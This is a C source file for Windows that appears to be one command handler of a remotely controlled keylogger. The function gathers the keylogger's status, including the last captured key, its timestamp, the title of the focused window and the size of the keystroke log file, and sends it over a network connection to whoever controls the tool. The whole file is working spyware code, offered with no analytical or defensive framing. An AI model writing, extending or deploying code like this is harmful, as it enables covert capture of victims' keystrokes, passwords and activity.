#include <stdio.h>
#include <string.h>
#include <windows.h>
#include "net/interface.h"
#include "net/error.h"
#include "types.h"
#include "keylogger/keylogger.h"

#define SERV_KEYLOGGER_INFO_TYPE_GB 1
#define SERV_KEYLOGGER_INFO_TYPE_MB 2
#define SERV_KEYLOGGER_INFO_TYPE_KB 3
#define SERV_KEYLOGGER_INFO_TYPE_B 0

typedef struct __serv_keylogger_info
{
	uint8 isRunning;
	uint8 specKey;
	uint16 lastKey;
	uint32 lastError;
	long lastTime;
	uint8 lastFocusTitle[0xFF];
	double size;
	char sizeType;
}SERV_KEYLOGGER_INFO;

int cmds_KEYLOGGER_INFO(void)
{
	keylogger_IsBlocking = 1;
	KEYLOGGER_BLOCK_CPU_PROTECT();
	net_SetBuffer(NET_DATA_BUFFSIZE);

	SERV_KEYLOGGER_INFO klInfo;
	memset(&klInfo, 0, sizeof(SERV_KEYLOGGER_INFO));
	klInfo.isRunning = keylogger_IsRunning;
	klInfo.specKey = (keylogger_SpecKey & 0xF) << 4;
	klInfo.lastKey = keylogger_LastKey;
	klInfo.lastTime = keylogger_LastTime;
	klInfo.lastError = keylogger_LastError;
	strcpy((char*)klInfo.lastFocusTitle, keylogger_LastFocusTitle);

	fseeko64(keylogger_F, 0, SEEK_END);
	uint64 size = ftello64(keylogger_F);

	if(size / (1024 * 1024 * 1024))
	{
		klInfo.size = size / (1024 * 1024 * 1024);
		klInfo.sizeType = SERV_KEYLOGGER_INFO_TYPE_GB;
	}else if(size / (1024 * 1024)){
		klInfo.size = size / (1024 * 1024);
		klInfo.sizeType = SERV_KEYLOGGER_INFO_TYPE_MB;
	}else if(size / 1024){
		klInfo.size = size / 1024;
		klInfo.sizeType = SERV_KEYLOGGER_INFO_TYPE_KB;
	}else{
		klInfo.size = size;
		klInfo.sizeType = SERV_KEYLOGGER_INFO_TYPE_B;
	}

	keylogger_IsBlocking = 0;

	if(net_SendData((uint8*)&klInfo, sizeof(SERV_KEYLOGGER_INFO)) < 1)
	{
		net_SetBuffer(NET_BUFFSIZE);

		return 0;
	}

	net_SetBuffer(NET_BUFFSIZE);

	return 1;
}